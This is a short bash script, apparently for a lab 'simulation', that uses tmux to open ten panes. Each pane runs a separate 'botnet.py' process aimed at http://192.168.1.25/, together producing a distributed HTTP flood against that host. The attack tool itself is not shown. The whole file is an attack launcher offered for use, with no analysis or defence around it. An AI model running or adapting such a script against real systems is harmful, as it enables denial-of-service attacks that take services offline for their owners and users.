#!/bin/bash

# Session name allocated for HTTP Flood
SESSION_NAME="http_ddos_simulation"

# 1. Create a new tmux session in the background
tmux new-session -d -s $SESSION_NAME

# 2. Create 9 additional divisions to make a total of 10 parts
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. Send the script run command to each pane
# Make sure the botnet.py file is in the same path
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "python3 botnet.py http://192.168.1.25/" C-m
done

# 4. Enter the session to view the distributed attack
tmux attach-session -t $SESSION_NAME
